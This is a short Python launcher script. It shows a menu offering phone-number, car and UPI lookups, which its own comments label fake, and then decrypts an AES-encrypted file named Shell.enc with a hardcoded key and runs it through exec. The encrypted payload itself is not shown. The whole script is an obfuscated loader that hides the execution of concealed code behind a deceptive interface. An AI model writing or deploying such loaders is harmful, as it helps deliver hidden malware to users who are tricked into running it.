# start.py
import os
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from colorama import Fore, Style

# ---------- CONFIG ----------
ENC_FILE = "Shell.enc"
KEY = b64decode("LrzLae/iO/QTu109CcAgw2Qxuxc+uftJk68cicdVXkU=")  # 32 bytes
BLOCK_SIZE = AES.block_size

def show_menu():
    os.system("clear")
    print(Fore.YELLOW + "==================================")
    print("        Launcher Menu ")
    print("==================================")
    print("1. Number Info")
    print("2. Car Info")
    print("3. UPI Info")
    print("==================================" + Style.RESET_ALL)
    input(Fore.YELLOW + "Choose any option > " + Style.RESET_ALL)  # fake menu

def decrypt_and_run():
    with open(ENC_FILE, "rb") as f:
        data = f.read()
    iv = data[:BLOCK_SIZE]
    ct = data[BLOCK_SIZE:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted_code = unpad(cipher.decrypt(ct), BLOCK_SIZE).decode("utf-8")
    # Use globals() to allow proper imports and references
    exec(decrypted_code, globals())

if __name__ == "__main__":
    show_menu()        # show fake menu
    try:
        decrypt_and_run()  # run Shell.enc
    except Exception as e:
        print(Fore.RED + f"Error running Shell.enc: {e}" + Style.RESET_ALL)
